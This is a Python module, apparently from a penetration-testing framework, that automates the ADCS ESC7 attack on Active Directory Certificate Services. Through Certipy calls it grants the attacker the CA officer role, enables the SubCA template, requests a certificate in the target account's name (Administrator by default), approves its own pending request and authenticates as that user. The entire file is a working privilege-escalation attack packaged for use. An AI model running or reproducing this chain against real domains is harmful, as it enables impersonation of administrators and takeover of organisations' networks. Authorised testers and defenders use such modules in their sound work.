import os

from module import BaseModule
from tool import Tool

class ADCSESC7(BaseModule):
    name = "ADCS - ESC7"
    path = "adcs/esc7"
    description = "ESC7: Dangerous Permissions on CA"
    info = """An attacker with the necessary permissions on the CA AD object can manipulate its settings, such as enabling the EDITF_ATTRIBUTESUBJECTALTNAME2 flag (ESC6) or changing the security descriptor to grant themselves enrollment rights.

Prerequisites:
  - The attacker has write permissions on the CA server's AD object (msPKI-Enrollment-Servers property)."""

    options = {
        "ca_host": {"default": "", "description": "ADCS CA Server IP or host address", "required": True},
        "ca_name": {"default": "", "description": "ADCS CA Name", "required": True},
        "dc_ip": {"default": "", "description": "DC IP or host address. If empty, domain will be used.", "required": False},
        "target_account": {"default": "Administrator", "description": "Account to attempt to compromise", "required": False},
        "domain": {"default": "", "description": "Auth: Domain name (FQDN)", "required": True},
        "username": {"default": "", "description": "Auth: Username (must have ManageCA privilege)", "required": True},
        "password": {"default": "", "description": "Auth: Password or NT Hash (for NTLM auth only)", "required": False},
        "auth": {"default": "ntlm", "description": "Auth: Type (ntlm, krb)", "required": True},
    }

    
    def __init__(self, registry, job_manager):
        super().__init__(registry, job_manager)

    async def run(self):
        if not self.validate_options():
            return

        os.chdir(self.logs_dir)
        tool = Tool(self)
        if not tool.set_auth(from_module=True):
            return
        pfx = self.uniq_filename(self.opts.target_account)
        
        tool.title("Add officer role to user")
        if not await tool.certipy_ca(['-add-officer', self.opts.username]):
            return
        
        tool.title("Enable the SubCA Template")
        if not await tool.certipy_ca(['-enable-template', 'SubCA']):
            return
        
        tool.title("Request a certificate using the SubCA templat")
        if not await tool.certipy_req(['-template', 'SubCA', '-upn', f'{self.opts.target_account}@{self.opts.domain}']):
            return
        
        if not tool.request_id:
            return

        tool.title("Approve the pending request")
        if not await tool.certipy_ca(['-issue-request', tool.request_id]):
            return
        
        tool.title("Retrieve the issued certificate")
        if not await tool.certipy_req(['-retrieve', tool.request_id, '-out', pfx]):
            return
        
        tool.title("Authenticate as the target user")
        if not await tool.certipy_auth(pfx, ['-no-save']):
            return

        self.pane_b.write("[bold green][*] Attack successful.[/bold green]")
